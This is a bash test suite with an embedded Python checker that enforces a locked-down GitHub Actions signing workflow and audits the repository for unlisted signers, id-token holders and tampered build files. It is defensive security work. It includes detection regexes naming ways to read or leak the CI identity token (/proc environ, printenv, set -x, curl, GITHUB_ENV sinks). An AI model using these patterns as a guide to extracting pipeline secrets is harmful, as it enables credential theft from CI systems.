#!/usr/bin/env bash
# proves: REQ-CHAIN-001-AC1, REQ-CHAIN-001-AC2, REQ-CHAIN-001-AC3, REQ-CHAIN-002-AC4, REQ-CHAIN-003-AC5, REQ-CHAIN-007-AC18
# The Sign boundary (v0.3.0 rules 50, 50a, 52, 52a, 53a; owner RATIFIED Oct 9), static half. Three judges, each first proven
# on a known-good fixture and on every mutated copy (a judge that cannot fail proves nothing), then applied to the real repo:
#   judge_sign  stage-sign.yml is an ALLOWLIST: a reusable workflow of one job on a GitHub-hosted runner whose only input is
#               `digests`, with no outputs and no secrets, whose steps are exactly, in order:
#                 1. actions/checkout (persist-credentials: false, explicit)
#                 2. actions/download-artifact name witness-build path witness-build (Build's signed Witness record: DATA, never run)
#                 3. run: bash bin/install-scanner.sh cosign     (the signing tool, pinned by checksum like gitsign; the PR adds
#                                                                 cosign to bin/install-scanner.sh)
#                 4. run: printf '%s' "$DIGESTS" > digests.json  (env DIGESTS: ${{ inputs.digests }}, the only env in the job)
#                 5. run: python3 -I -B bin/chain-verify.py sign --check --signer cosign --digests digests.json
#                         --build-record witness-build/build-collection.json --template .github/policy/release-policy.template.json --out provenance
#                         (the filenames are PINNED: `--template` names the committed template, from which `sign --check` makes the
#                          per-tag policy with the committed trust file and the tag from GITHUB_REF, rule 57; it verifies Build's
#                          record, compares the digests, THEN signs; the identity token is requested by cosign
#                          inside its own process and no step ever names it)
#                 6. actions/upload-artifact name provenance path provenance
#               Everything else fails closed (rules 52, 52a; 001-AC1..AC3). The four sinks rule 52a names (file, artifact, log,
#               step output) are each a named mutation. QUESTION FOR THE PARENT: cosign (above) or Witness for Sign's signature?
#               Cosign is proposed because the provenance is customer-verifiable and rule 53b needs a Rekor entry, which Witness
#               cannot write (Witness has no Rekor support, rule 53b); the Witness record of Build stays Witness.
#   judge_build 002-AC4: a Build signing step takes nothing from a secret or the job token. Judged when the file has
#               signing steps (stage-build.yml today signs with attest actions and is rewritten in PR 2).
#   judge_tree  001-AC1 over the tracked files of .github/ and bin/ plus the pinned build configuration, one function per AC1 clause:
#               only_new_workflow (stage-sign.yml is the only file added since v0.2.2); listed_signers + direct_signers (every workflow and
#               composite action matched against the signer table; provenance only in stage-sign.yml, every other signer listed with a
#               reason in .github/policy/chain-signers.json); stage_grammars (every stage-*.yml over the closed key, env, uses and run-line
#               grammar, running only scripts listed in .github/policy/chain-scripts.json by path and sha256); listed_scripts (each listed
#               script scanned as raw text, signing only as its row says; only bin/chain-verify.py `sign` may sign provenance). Three CLOSED
#               lists keep this from being a text scan: id_token_jobs (.github/policy/id-token-jobs.json: the only jobs that may hold
#               id-token: write, which keyless signing needs; a << merge key in permissions or an unparsable workflow fails closed),
#               build_config (.github/policy/build-config-files.json: the build configuration outside bin/ and .github/ pinned by sha256),
#               frozen_files (.github/policy/legacy-stage-files.json: the eleven legacy
#               stage files PRs 2-4 rewrite, pinned by sha256; their own findings are left out; the LISTED scripts they run are still
#               followed, an UNLISTED file they run is never scanned). stdlib_shadows refuses a file or directory under bin/ or .github/
#               named after a standard-library module; the Sign step and every python3 line of a stage file run isolated (python3 -I).
#               The real tree is an ordinary `expect ok`. STATED EXCLUSIONS: a command built at run time inside a listed script; a signer
#               step added to a job already on the id-token list but missing from the signer table (review and the pin checker see it);
#               keyed signing (outside the keyless model: Release accepts only a Fulcio certificate whose SAN is stage-sign.yml at the tag).
#   (shared)    the signer table bin/chain-test-signers.json is read by this test and by chain-records-test.sh, so the two cannot
#               disagree about what a signer is; comments are stripped before matching (a trailing `# verify` exempts nothing).
# Stated exclusions: a signer reached only through an argv array in script code (exec.exec('cosign', ['sign'])), a python/js
# script that spawns another program, or a binary downloaded at run time is not seen by a text table; the Sign job's own allowlist
# and the dry run cover the Sign side. The engine and table are bin/chain-test-signers.py / .json (shared with chain-records-test.sh).
# Needs python3 with PyYAML (apt: python3-yaml).
# Modelled on: this repo's bin/workflow-consolidation-test.sh (judge + mutation pattern); in-toto-witness docs/commands.md
# (witness run / sign flags) and docs/attestors/slsa.md for the signing-call patterns.
set -euo pipefail
# the red cases of this suite are the ones listed in test-evidence/known-red.json: the run passes only when they are EXACTLY the red cases (bin/chain-known-red.py)
if [ -z "${CHAIN_KNOWN_RED_INNER:-}" ]; then
  _rc=0; _out=$(CHAIN_KNOWN_RED_INNER=1 CHAIN_FINDINGS=1 bash "$0" "$@" 2>&1) || _rc=$?
  printf '%s\n' "$_out"
  printf '%s\n' "$_out" | python3 "$(cd "$(dirname "$0")" && pwd)/chain-known-red.py" judge --suite bin/chain-sign-wiring-test.sh --inner-rc "$_rc"
  exit $?
fi
root=$(cd "$(dirname "$0")/.." && pwd)
work=$(mktemp -d); trap 'rm -rf "$work"' EXIT
pass=0 failn=0
python3 -c 'import yaml' 2> /dev/null || { echo "FAIL python3 needs PyYAML (apt install python3-yaml)"; exit 1; }
cat > "$work/judge.py" <<'PY'
import glob, json, os, re, sys, yaml
SHA = r"[0-9a-f]{40}"
TOKEN = r"ACTIONS_ID_TOKEN|ACTIONS_RUNTIME|id-token|getIDToken|oidc|/proc/\S*environ|\bprintenv\b|\benv\b\s*(\||>|$)|\bset\s+-\w*x"

sys.path.insert(0, os.path.join(os.environ["CHAIN_ROOT"], "bin"))
import importlib.util
_spec = importlib.util.spec_from_file_location("chain_test_signers", os.path.join(os.environ["CHAIN_ROOT"], "bin/chain-test-signers.py"))
_cts = importlib.util.module_from_spec(_spec); _spec.loader.exec_module(_cts)
TABLE = _cts.load_table()
strip, logical = _cts.strip, _cts.logical
yload = _cts.yload                       # the ONE duplicate-refusing loader, shared with the hostile judge
def load(path):
    return yload(open(path).read()), open(path).read()
def signer_calls(text, strip_comments=True): return _cts.signer_calls(text, TABLE, strip_comments)

R_PRINTF = r"printf '%s' \"\$DIGESTS\" > digests\.json"
R_INSTALL = r"bash bin/install-scanner\.sh cosign"
R_SIGN = r"python3 -I -B bin/chain-verify\.py sign --check --signer cosign --digests digests\.json --build-record witness-build/build-collection\.json --template \.github/policy/release-policy\.template\.json --out provenance"
def judge_sign(path):
    if not os.path.exists(path): return ["missing: " + path]
    try: d, text = load(path)
    except Exception as ex: return ["AC1: %s cannot be judged (%s: %s)" % (os.path.basename(path), type(ex).__name__, ex)]
    bad = []
    extra_top = set(d) - {"name", "on", "permissions", "jobs"}
    if extra_top: bad.append("AC3: top-level keys %s are not allowed (defaults.run.shell, concurrency, run-name, env can reroute every run step)" % sorted(extra_top))
    on = d.get("on")
    if not isinstance(on, dict) or set(on) != {"workflow_call"}:
        bad.append("AC1: on: must be exactly workflow_call: %s" % on)
    call = (on or {}).get("workflow_call") or {} if isinstance(on, dict) else {}
    inputs = call.get("inputs") or {}
    if set(inputs) != {"digests"} or (inputs.get("digests") or {}).get("type") != "string":
        bad.append("AC2: the only input must be `digests` (string), found %s" % sorted(inputs))
    if call.get("secrets"): bad.append("AC3: the workflow declares secrets")
    if call.get("outputs"): bad.append("AC3 (step output sink): workflow_call outputs are not allowed")
    if d.get("env"): bad.append("AC3: workflow-level env is not allowed")
    if re.search(r"secrets\b|toJSON|\bcontext\b", text): bad.append("AC3/002-AC4: secrets, toJSON or context appear in the file")
    jobs = d.get("jobs") or {}
    if len(jobs) != 1: bad.append("AC1: exactly one job required, found %d" % len(jobs))
    for name, j in jobs.items():
        ro = j.get("runs-on")
        if not isinstance(ro, str) or not _cts.HOSTED.fullmatch(ro):   # the ONE closed runner set, shared with the stage grammar (Sonnet r7 R2)
            bad.append("AC1: job %s must run on a GitHub-hosted ubuntu runner, got %r" % (name, ro))
        for k in ("container", "services", "uses", "env", "outputs", "strategy", "needs", "environment", "defaults", "if", "secrets"):
            if k in j: bad.append("AC2/AC3: job %s has `%s`, which Sign's job must not have" % (name, k))
        perm = j.get("permissions")
        if not isinstance(perm, dict) or perm.get("id-token") != "write" or any(v == "write" for k, v in perm.items() if k != "id-token"):
            bad.append("AC3: Sign's permissions must be id-token: write and no other write: %s" % perm)
        order = []
        for s in j.get("steps") or []:
            sn = s.get("name") or s.get("uses") or s.get("run")
            extra = set(s) - {"name", "uses", "with", "run", "env", "id"}
            if extra: bad.append("AC2: step %r has %s" % (sn, sorted(extra)))
            u, w, run, env = s.get("uses"), s.get("with") or {}, s.get("run"), s.get("env") or {}
            if (u is None) == (run is None): bad.append("AC2: step %r must have exactly one of uses/run" % sn); continue
            if u is not None and env: bad.append("AC3: step %r passes env to an action" % sn)
            if u is not None:
                m = re.fullmatch(r"(actions/[a-z-]+)@(%s)( #.*)?" % SHA, u)
                if not m: bad.append("AC2: step %r uses %r; only a pinned actions/checkout, download-artifact or upload-artifact" % (sn, u)); continue
                act = m.group(1)
                if act == "actions/checkout":
                    order.append("checkout")
                    if set(w) - {"persist-credentials", "fetch-depth"} or w.get("persist-credentials") != "false":
                        bad.append("AC3: checkout must say persist-credentials: false explicitly (the default writes the job token into .git/config): %s" % w)
                elif act == "actions/download-artifact":
                    order.append("download")
                    if w.get("name") != "witness-build" or set(w) - {"name", "path"} or w.get("path", "witness-build") != "witness-build":
                        bad.append("AC2: step %r downloads %s; only the artifact witness-build into witness-build (data, never run)" % (sn, w))
                elif act == "actions/upload-artifact":
                    order.append("upload")
                    if w.get("path") != "provenance" or w.get("name") != "provenance" or set(w) - {"name", "path", "if-no-files-found", "retention-days"}:
                        bad.append("AC3 (artifact sink): step %r uploads %s; only the path `provenance` (name provenance) may leave Sign" % (sn, w))
                else:
                    bad.append("AC2: step %r uses %s, which Sign may not" % (sn, act))
            else:
                if not isinstance(run, str) or "\\\n" in run or re.search(r"[^\x20-\x7e\n]", run):
                    bad.append("AC1 run line: step %r has a backslash-newline or a control, non-ASCII or invisible character (str.strip() and bash would read different words)" % sn); continue
                line = run.strip()
                if "\n" not in line and re.fullmatch(R_PRINTF, line):
                    order.append("printf")
                    if env != {"DIGESTS": "${{ inputs.digests }}"}: bad.append("AC3: the digests step must have exactly env DIGESTS: ${{ inputs.digests }}, found %s" % env)
                elif "\n" not in line and re.fullmatch(R_INSTALL, line):
                    order.append("install")
                    if env: bad.append("AC3: step %r passes env" % sn)
                elif "\n" not in line and re.fullmatch(R_SIGN, line):
                    order.append("sign")
                    if env: bad.append("AC3: the signing step passes env %s; the digests come from the file" % sorted(env))
                else:
                    sinks = [n for n, rx in (("file", r">>?\s*\S|\btee\b|\bcp\b|\bmv\b"), ("log", r"\becho\b|\bprintf\b|\bcat\b|\bset\s+-\w*x"),
                                             ("step output", r"GITHUB_(OUTPUT|ENV|STEP_SUMMARY|PATH)"), ("artifact", r"upload|curl|\bgh\b")) if re.search(rx, run)]
                    why = "touches the identity token request (sinks reachable: %s)" % (", ".join(sinks) or "none, but no step may touch it") if re.search(TOKEN, run, re.I) else "is not one of the three allowed command lines (install cosign; write digests.json from env; chain-verify.py sign --check ... --out provenance)"
                    bad.append("AC2/AC3: run step %r %s" % (sn, why))
                if "${{" in run or ".." in run: bad.append("AC2: run step %r interpolates an expression or uses `..`" % sn)
        want = ["checkout", "download", "install", "printf", "sign", "upload"]
        if order != want: bad.append("AC2: Sign's steps must be exactly %s in that order (the check-then-sign step is the only signer), found %s" % (want, order))
    return bad

def judge_build(path):
    if not os.path.exists(path): return []
    try: d, text = load(path)
    except Exception as ex: return ["AC1: %s cannot be judged (%s: %s)" % (os.path.basename(path), type(ex).__name__, ex)]
    bad = []
    wf_env = d.get("env") or {}
    for jn, j in (d.get("jobs") or {}).items():
        steps = j.get("steps") or []
        signs = [s for s in steps if signer_calls(yaml.dump(s, width=10**6))]
        if not signs: continue
        job_blob = yaml.dump([j.get("env") or {}, j.get("secrets") or {}, wf_env], width=10**6)
        if re.search(r"secrets\.|secrets\[|github\.token|toJSON|secrets\b", job_blob) or j.get("environment") or j.get("secrets"):
            bad.append("002-AC4: job %s has signing steps and job/workflow-level env, secrets or an environment that can hand a secret to them" % jn)
        for s in steps:
            if re.search(r"GITHUB_ENV", str(s.get("run") or "")) and re.search(r"secrets\.|github\.token|toJSON|ACTIONS_ID_TOKEN|\$\{\{", str(s.get("run") or "") + yaml.dump(s.get("env") or {}, width=10**6)):
                bad.append("002-AC4: job %s writes a secret or token into GITHUB_ENV in a job that signs" % jn)
        for s in signs:
            blob = yaml.dump(s, width=10**6); nm = s.get("name") or s.get("uses")
            if re.search(r"secrets\.|secrets\[|github\.token|toJSON|secrets\b", blob):
                bad.append("002-AC4: signing step %r takes a secret or the job token" % nm)
            for fm in re.finditer(r"--(annotation|certificate-[a-z-]+|oidc-[a-z-]+|fulcio-oidc-client-id|signer-fulcio-[a-z-]+)[ =]+\S*\$\{\{", blob):
                bad.append("002-AC4: signing step %r puts an expression into %s" % (nm, fm.group(1)))
    return bad

# FROZEN LEGACY FILES: the eleven legacy stage files PRs 2-4 rewrite on chain-v030, pinned by sha256 in .github/policy/legacy-stage-files.json
# a PR that rewrites a legacy file removes its row AND its pinned entry; adding or changing an entry here is a reviewed edit and is
# refused by every other case (advisor ruling, Oct 10: the list is a pre-existing residual that can only shrink). Copied from the list at ae15a44.
LEGACY_PINNED = {}     # PR 4 rewrote the last legacy stage file (stage-promote.yml) and deleted legacy-stage-files.json; the list can only shrink, so it stays empty
LEGACY_EXPECTED = set(LEGACY_PINNED)
def sha256_of(path):
    import hashlib
    return hashlib.sha256(open(path, "rb").read()).hexdigest()

def frozen_files(base, bad):
    """The repo paths of the listed legacy files whose bytes match the list (their own findings are left out). No list: nothing is frozen.
    The list must name exactly the eleven legacy paths, all under .github/workflows/; a listed file that is missing is a finding, one
    whose bytes differ is judged in full."""
    p = os.path.join(base, ".github/policy/legacy-stage-files.json")
    if not os.path.exists(p): return set()
    try: listed = {r["path"]: r["sha256"] for r in _cts.jload(p)["files"]}
    except Exception as ex: bad.append("AC1: legacy-stage-files.json is malformed (%s)" % ex); return set()
    outside = sorted(x for x in listed if not re.fullmatch(r"\.github/workflows/[\w.-]+\.ya?ml", x) or ".." in x)
    if outside: bad.append("AC1: legacy-stage-files.json lists a path outside .github/workflows/: %s" % outside); return set()
    if set(listed) != LEGACY_EXPECTED:
        bad.append("AC1: legacy-stage-files.json does not list exactly the eleven legacy stage files: %s" % sorted(set(listed) ^ LEGACY_EXPECTED)); return set()
    rehashed = sorted(x for x, h in listed.items() if h != LEGACY_PINNED[x])
    if rehashed: bad.append("AC1: legacy hash is not the one this suite pins (the list can only shrink): %s" % rehashed); return set()
    frozen = set()
    for x, want in sorted(listed.items()):
        f = os.path.join(base, x)
        if not os.path.isfile(f): bad.append("AC1: legacy file missing: %s: update legacy-stage-files.json or delete it" % x)
        elif sha256_of(f) != want: bad.append("AC1: legacy file changed (judged in full): %s" % x)
        else: frozen.add(x)
    return frozen

# BUILD CONFIGURATION outside bin/ and .github/ that the build tooling reads (the file allowlist's config files): pinned by sha256
BUILD_CONFIG_GLOBS = (".gitignore", ".golangci.yml", ".grype.yaml", ".ko.yaml", ".gremlins.yaml", ".githooks/*")
def build_config(base, bad):
    """Every build configuration file is listed with its sha256 in .github/policy/build-config-files.json; a changed, missing or unlisted
    one is a finding (rule 61: goreleaser and the Dockerfiles are removed, so there is no file whose keys need a closed set)."""
    p = os.path.join(base, ".github/policy/build-config-files.json")
    try: listed = {r["path"]: r["sha256"] for r in (_cts.jload(p)["files"] if os.path.exists(p) else [])}
    except Exception as ex: bad.append("AC1: build-config-files.json is malformed (%s)" % ex); return
    present = sorted({os.path.relpath(f, base) for g in BUILD_CONFIG_GLOBS for f in glob.glob(os.path.join(base, g)) if os.path.isfile(f)})
    for x in present:
        if x not in listed: bad.append("AC1: build config file not listed: %s: add it to build-config-files.json with its sha256" % x)
        elif sha256_of(os.path.join(base, x)) != listed[x]: bad.append("AC1: build config file changed: %s: update build-config-files.json or delete it" % x)
    for x in sorted(set(listed) - set(present)): bad.append("AC1: build config file missing: %s: update build-config-files.json" % x)

COMPILED = (".pyc", ".pyo", ".so", ".pyd", ".dll")

def compiled_code(base, bad):
    """No __pycache__ directory and no compiled or native code file (.pyc .pyo .so .pyd .dll) anywhere under bin/ or .github/ (Opus #249
    r5): Python would run it instead of, or beside, the hashed source."""
    for top in ("bin", ".github"):
        for dp, dirs, fs in os.walk(os.path.join(base, top)):
            for x in sorted(dirs):
                if x.lower() == "__pycache__": bad.append("AC1: %s is a bytecode cache directory (only hashed source may run)" % os.path.relpath(os.path.join(dp, x), base))
            for x in sorted(fs):
                if x.lower().endswith(COMPILED): bad.append("AC1: %s is compiled or native code (only hashed source may run)" % os.path.relpath(os.path.join(dp, x), base))

def stdlib_shadows(base, bad):
    """No file or directory under bin/ or .github/ is named after a standard-library module (Opus #249 r4): Python puts a script's own
    directory first on sys.path, so bin/json.py, bin/hashlib.pyc, bin/__pycache__/argparse.*.pyc or a bin/base64/ package would replace
    that module for any script run from there without -I. The Sign job runs isolated (python3 -I); this is the second belt."""
    names = set(sys.stdlib_module_names)
    for top in ("bin", ".github"):
        for dp, dirs, fs in os.walk(os.path.join(base, top)):
            for x in sorted(dirs):
                if x.lower() in names: bad.append("AC1: %s is a directory named after the standard-library module %s" % (os.path.relpath(os.path.join(dp, x), base), x))
            for x in sorted(fs):
                stem = x.split(".")[0].lower()
                if x.lower().endswith((".py", ".pyc")) and stem in names:
                    bad.append("AC1: %s is named after the standard-library module %s (it would shadow it)" % (os.path.relpath(os.path.join(dp, x), base), stem))

MERGE_TAG = "tag:yaml.org,2002:merge"

def merge_keys(base, files, bad):
    """No YAML merge key anywhere in any workflow or composite action (Opus #249 r5; one structural rule for an open class): a `<<` key or a
    node tagged !!merge, at any depth, would supply keys that a reader which does not merge (BaseLoader) never sees."""
    for f in signing_files(base):
        try: root = yaml.compose(open(f).read(), Loader=yaml.BaseLoader)
        except Exception as ex:             # fail closed: a file that cannot be read as ONE YAML document cannot be judged
            bad.append("AC1: %s does not parse as one YAML document (%s)" % (os.path.relpath(f, base), type(ex).__name__)); continue
        todo, seen = [(root, "")], set()
        while todo:
            n, path = todo.pop()
            if n is None or id(n) in seen: continue      # each node once: an alias bomb shares nodes and must not explode the walk
            seen.add(id(n))
            if n.tag == MERGE_TAG: bad.append("AC1: %s%s uses a merge key (!!merge); write it out in full" % (os.path.relpath(f, base), path))
            if isinstance(n, yaml.MappingNode):
                keys = set()
                for k, v in n.value:
                    kv = k.value if isinstance(k, yaml.ScalarNode) else "?"
                    if not isinstance(k, yaml.ScalarNode): bad.append("AC1: %s%s has a mapping key that is not a plain scalar" % (os.path.relpath(f, base), path))
                    elif kv.strip().casefold() in keys: bad.append("AC1: %s%s repeats the key %r (a YAML reader keeps only one of them)" % (os.path.relpath(f, base), path, kv))
                    else: keys.add(kv.strip().casefold())
                    if isinstance(k, yaml.ScalarNode) and k.value.strip() == "<<": bad.append("AC1: %s%s uses a merge key (<<); write it out in full" % (os.path.relpath(f, base), path))
                    todo += [(k, path + "/" + kv), (v, path + "/" + kv)]
            elif isinstance(n, yaml.SequenceNode):
                todo += [(x, "%s/%d" % (path, i)) for i, x in enumerate(n.value)]

def id_token_jobs(base, files, bad):
    """A job may hold id-token: write (its own permissions, or the workflow's when it sets none; write-all counts) only if
    .github/policy/id-token-jobs.json lists (workflow, job) with a reason; a listed pair that does not hold it is stale. Keyless signing needs
    the job's OIDC token, so this closes signers the text scans cannot see: remote reusable workflows, in-process libraries, files outside
    bin/ and .github/, tools missing from the signer table."""
    p = os.path.join(base, ".github/policy/id-token-jobs.json")
    try: rows = _cts.jload(p)["jobs"] if os.path.exists(p) else []
    except Exception as ex: bad.append("AC1: id-token-jobs.json is malformed (%s)" % ex); return
    listed = set()
    for r in rows:
        if not str(r.get("reason") or "").strip(): bad.append("AC1: id-token-jobs.json row without a reason: %s" % r)
        listed.add((r.get("workflow"), r.get("job")))
    def holds(perm):                    # case-insensitive (Sonnet r5): Write and Write-All count as holding the token here
        if isinstance(perm, str): return perm.strip().lower() == "write-all"
        return isinstance(perm, dict) and any(str(k).strip().lower() == "id-token" and str(v).strip().lower() == "write" for k, v in perm.items())
    held = set()
    for f in files:
        try: d = yload(open(f).read()) or {}
        except Exception as ex:
            bad.append("AC1: %s does not parse, so its id-token holders cannot be checked (%s)" % (os.path.basename(f), type(ex).__name__)); continue
        wf = os.path.basename(f)
        if not isinstance(d, dict) or not isinstance(d.get("jobs", {}), dict):
            bad.append("AC1: %s is not a workflow mapping with a jobs mapping, so its id-token holders cannot be checked" % wf); continue
        for jn, j in (d.get("jobs") or {}).items():
            if isinstance(j, dict) and holds(j["permissions"] if "permissions" in j else d.get("permissions")):
                held.add((os.path.basename(f), jn))
    for wf, jn in sorted(held - listed): bad.append("AC1: %s job %s holds id-token: write but is not listed in id-token-jobs.json" % (wf, jn))
    for wf, jn in sorted(listed - held): bad.append("AC1: id-token-jobs.json lists %s job %s, which does not hold id-token: write (stale)" % (wf, jn))

action_files, signing_files = _cts.action_files, _cts.signing_files   # ONE discovery routine, shared with the records judge (B8)

V022_WORKFLOWS = set("""acceptance.yml agent-review-gate.yml auditor.yml ci.yml codeql.yml dependabot-auto-merge.yml dependabot-reviewer.yml
go-freshness.yml main-candidate-rescan.yml release.yml reserved-branch-guard.yml scan.yml scorecard.yml
stage-acceptance-artifacts.yml stage-promote.yml stage-acceptance-k8s.yml stage-acceptance-predicate.yml
stage-admission.yml stage-authorize.yml stage-build.yml stage-image.yml stage-promote.yml stage-reproducibility.yml
stage-verify.yml supply-chain.yml""".split())

def only_new_workflow(files, bad):
    """001-AC1: "it is the only workflow file v0.3.0 adds beyond the files that existed at v0.2.2" (stage-sign.yml)."""
    new = sorted(os.path.basename(f) for f in files if os.path.basename(f) not in V022_WORKFLOWS)
    if new != ["stage-sign.yml"]: bad.append("AC1: workflow files added since v0.2.2 must be exactly [stage-sign.yml], found %s" % new)

def listed_signers(base, bad):
    """001-AC1: "every other signing call being listed with its reason in .github/policy/chain-signers.json" (never a provenance signer)."""
    allowed, sf = {}, os.path.join(base, ".github/policy/chain-signers.json")
    if not os.path.exists(sf): bad.append("AC1: missing .github/policy/chain-signers.json (the signing calls other than Sign's provenance, each with a reason)"); return allowed
    try: srows = _cts.jload(sf).get("signers") or []
    except Exception as ex: bad.append("AC1: chain-signers.json is malformed (%s)" % ex); return allowed
    for r in srows:
        if not str(r.get("reason") or "").strip(): bad.append("AC1: signer row without a reason: %s" % r)
        if any(e["prov"] == "always" for e in TABLE if re.search(e["regex"], str(r.get("tool", "")))): bad.append("AC1: signer list names a provenance signer: %s" % r)
        allowed.setdefault(r.get("file"), set()).add(r.get("tool"))
    return allowed

def decoded_text(d):
    """The step text GitHub runs, as YAML DECODES it (Sonnet #249 r7 R1): for every step of every job (jobs.*.steps) or of a composite
    action (runs.steps), its uses: and its run: on a step line, then each with: value, in the step-line shape the signer table's step
    context expects. Folded and plain multi-line scalars, escapes (\\t, \\x63, \\u0063, an escaped line break), tags and flow forms
    are all resolved by the parser, so the scan sees the command the runner sees."""
    steps = []
    if isinstance(d, dict):
        for j in (d.get("jobs") or {}).values() if isinstance(d.get("jobs"), dict) else []:
            if isinstance(j, dict):
                if isinstance(j.get("uses"), str): steps.append({"uses": j["uses"], "with": j.get("with")})
                steps += [x for x in (j.get("steps") or []) if isinstance(x, dict)] if isinstance(j.get("steps"), list) else []
        runs = d.get("runs")
        if isinstance(runs, dict) and isinstance(runs.get("steps"), list): steps += [x for x in runs["steps"] if isinstance(x, dict)]
    out = []
    for st in steps:
        if isinstance(st.get("uses"), str): out.append("- uses: " + st["uses"])
        if isinstance(st.get("run"), str): out.append("- run: " + st["run"])
        w = st.get("with")
        for k, v in (w.items() if isinstance(w, dict) else []):
            out.append("  %s: %s" % (k, v if isinstance(v, str) else json.dumps(v)))
    return "\n".join(out) + "\n"

def decoded_signer_calls(f, rel, bad):
    """signer_calls over the decoded step text; a file that does not parse (with the duplicate-refusing loader) is a finding."""
    try: d = yload(open(f).read())
    except Exception as ex:
        bad.append("AC1: %s does not parse, so its decoded steps cannot be scanned for signers (%s)" % (rel, type(ex).__name__)); return []
    return signer_calls(decoded_text(d))

def direct_signers(base, files, frozen, allowed, bad):
    """001-AC1: "no other workflow, composite action ... signs provenance" (each workflow and composite action matched by the signer table)."""
    wfdir = os.path.join(base, ".github/workflows")
    disc = []
    found = signing_files(base, disc)          # workflows, composite actions and any other jobs:/runs: YAML anywhere (Codex #249 r7 B8, r8 B4)
    bad += ["AC1: " + x for x in disc]
    for f in found:
        rel = os.path.relpath(f, wfdir) if f in files else os.path.relpath(f, base)
        if os.path.relpath(f, base) in frozen or rel == "stage-sign.yml": continue
        for e, pv, line in signer_calls(open(f).read()) + decoded_signer_calls(f, rel, bad):
            if pv: bad.append("AC1: %s signs provenance (%s: %s); only stage-sign.yml may" % (rel, e["name"], line[:80]))
            elif e["name"] not in allowed.get(rel, set()): bad.append("AC1: %s calls %r, which is not listed with a reason in chain-signers.json" % (rel, e["name"]))

def stage_grammars(base, files, frozen, rows, envn, bad):
    """001-AC1: "every stage-*.yml is judged over a closed set of keys" (keys, env names, uses, run lines). Returns what each stage runs."""
    ran = {}
    for f in files:
        rel = os.path.basename(f)
        if not rel.startswith("stage-"): continue
        try: d = yload(open(f).read()) or {}
        except Exception as e: bad.append("AC1: %s does not parse (%s)" % (rel, e)); continue
        e, r = _cts.stage_grammar(rel, d, rows, envn, os.path.relpath(f, base))
        if os.path.relpath(f, base) not in frozen: bad += ["AC1 grammar: " + x for x in e]
        ran[rel] = set(r)                      # the LISTED scripts a frozen file runs are still followed (unlisted ones are never scanned)
    return ran

def listed_scripts(base, rows, ran, bad):
    """001-AC1: "a listed script is scanned as raw text ... and signs only as its signs value says; a script whose signs value is provenance
    is run by stage-sign.yml alone" (and only bin/chain-verify.py may have that row)."""
    def closure(paths):
        seen, todo = set(), list(paths)
        while todo:
            p = todo.pop()
            if p in seen or p not in rows: continue
            seen.add(p); todo += list(rows[p].get("runs") or [])
        return seen
    reach = {rel: closure(p) for rel, p in ran.items()}
    for p, row in sorted(rows.items()):
        text = _cts.read_script(os.path.join(base, p))
        bad += ["AC1: " + x for x in _cts.scan_script(p, text, row, rows, base)]
        signs = row.get("signs", False)
        for e, pv, line in signer_calls(text, False):      # raw text: a signer name in a comment, quote or heredoc counts
            if pv and signs != "provenance": bad.append("AC1: %s signs provenance (%s) but its row says signs=%r" % (p, e["name"], signs))
            elif not pv and not signs: bad.append("AC1: %s calls %s but its row says it signs nothing" % (p, e["name"]))
        if signs == "provenance" and not row.get("sign_subcommand"):
            for rel, rs in reach.items():
                if p in rs and rel != "stage-sign.yml": bad.append("AC1: %s signs provenance but %s runs it (only stage-sign.yml may)" % (p, rel))
        if signs == "provenance" and p != "bin/chain-verify.py": bad.append("AC1: %s has signs: provenance; only bin/chain-verify.py may" % p)

def judge_tree(base):
    """REQ-CHAIN-001-AC1 over a tree, one function per clause, plus the closed lists that keep the rule from being a text scan:
    frozen legacy files (legacy-stage-files.json), pinned build configuration (build-config-files.json), the jobs that may hold
    id-token: write (id-token-jobs.json), the signer table with chain-signers.json, and the stage grammar over chain-scripts.json."""
    bad = []
    bad_utf8 = _cts.non_utf8_yaml(base)         # final batch R-f: a file that is not UTF-8 is named and the judge stops (never a traceback)
    if bad_utf8: return ["AC1: %s is not valid UTF-8 (it cannot be read, so it cannot be judged)" % x for x in bad_utf8]
    wfdir = os.path.join(base, ".github/workflows")
    files = sorted(glob.glob(wfdir + "/*.yml") + glob.glob(wfdir + "/*.yaml"))
    frozen = frozen_files(base, bad)          # their OWN findings are left out; the listed scripts they run are still followed
    only_new_workflow(files, bad)
    direct_signers(base, files, frozen, listed_signers(base, bad), bad)
    build_config(base, bad)
    stdlib_shadows(base, bad)
    compiled_code(base, bad)
    merge_keys(base, files, bad)
    id_token_jobs(base, files, bad)           # every workflow, frozen ones included (their jobs are listed)
    rows, errs, envn = _cts.load_scripts(base)
    bad += ["AC1: " + e for e in errs]
    listed_scripts(base, rows, stage_grammars(base, files, frozen, rows, envn, bad), bad)
    return bad

def judge_calls(root):
    """REQ-CHAIN-003-AC5 (pipeline reading, advisor to confirm): a certificate's SAN is the file that runs the witness step
    (harness spike (b), case 5: a stage that calls another stage's file gets that file's SAN). So only release.yml may call
    stage-sign.yml and no stage file may call another stage file; other workflows (scan.yml, main-candidate-rescan.yml) may
    still call stage-build.yml / stage-image.yml, because the release policy pins the Build Config URI (release.yml at the tag)."""
    bad = []
    wd = os.path.join(root, ".github/workflows")
    for fn in sorted(os.listdir(wd)):
        if not fn.endswith((".yml", ".yaml")) or fn == "release.yml": continue
        try: d = yload(open(os.path.join(wd, fn)).read()) or {}
        except Exception as e: bad.append("AC5: %s does not parse (%s)" % (fn, e)); continue
        for jn, j in (d.get("jobs") or {}).items():
            refs = [str(j.get("uses", ""))] + [str(s.get("uses", "")) for s in (j.get("steps") or [])]
            for r in refs:
                if re.search(r"\.github/workflows/stage-sign\.ya?ml", r):
                    bad.append("AC5: %s job %s calls %s; only release.yml may call stage-sign.yml" % (fn, jn, r))
                elif fn.startswith("stage-") and re.search(r"\.github/workflows/stage-[^@\s]*\.ya?ml", r):
                    bad.append("AC5: %s job %s calls %s; a stage file may not call another stage file" % (fn, jn, r))
    return bad

if __name__ == "__main__":
    which, arg = sys.argv[1], sys.argv[2]
    bad = {"sign": judge_sign, "build": judge_build, "tree": judge_tree, "calls": judge_calls}[which](arg)
    ids = list(dict.fromkeys(bad))
    if ids and os.environ.get("CHAIN_FINDINGS") == "1":      # output only: the structured ids the known-red judge compares (bin/chain-known-red.py); nothing else changes
        print("FINDINGS-JSON " + json.dumps(ids), file=sys.stderr)
    print("; ".join(ids) or "ok"); sys.exit(1 if bad else 0)
PY
export CHAIN_SIGNER_TABLE="$root/bin/chain-test-signers.json" CHAIN_ROOT="$root"
judge() { python3 "$work/judge.py" "$@"; }
